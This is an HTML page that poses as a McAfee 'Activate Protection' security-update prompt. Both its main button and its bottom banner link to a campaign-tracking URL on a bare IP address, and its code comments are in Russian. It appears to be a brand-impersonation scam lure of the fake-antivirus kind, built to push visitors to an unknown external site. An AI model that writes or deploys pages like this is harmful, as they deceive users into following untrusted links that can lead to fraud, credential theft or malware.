<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>McAfee Protection</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #222;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
    }

    h1 {
      color: #c10000;
      font-size: 28px;
      margin-bottom: 10px;
    }

    p {
      font-size: 16px;
      color: #444;
      max-width: 300px;
    }

    .btn {
      display: inline-block;
      background-color: #c10000;
      color: #fff;
      text-decoration: none;
      padding: 14px 32px;
      font-size: 18px;
      font-weight: bold;
      border-radius: 8px;
      margin-top: 25px;
      transition: background-color 0.2s ease;
      border: none;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #a00000;
    }

    .alert {
      position: fixed;
      bottom: 15px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #c10000;
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      font-size: 14px;
      cursor: pointer;
      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
      transition: background-color 0.3s ease;
    }

    .alert:hover {
      background-color: #a00000;
    }
  </style>
</head>

<body>
  <h1>Activate Protection</h1>
  <p>Get the latest security update to protect your device and keep your data safe.</p>

  <!-- 🔹 Основная кнопка -->
  <a
    href="http://159.223.234.92/click?campaign_id=hWF1Y3"
    class="btn"
    id="activateBtn"
  >
    Activate Subscription
  </a>

  <!-- 🔹 Нижняя плашка (та же ссылка) -->
  <div
    class="alert"
    id="alertBtn"
    onclick="location.href='http://159.223.234.92/click?campaign_id=hWF1Y3'"
  >
    Activate Protection
  </div>
</body>
</html>
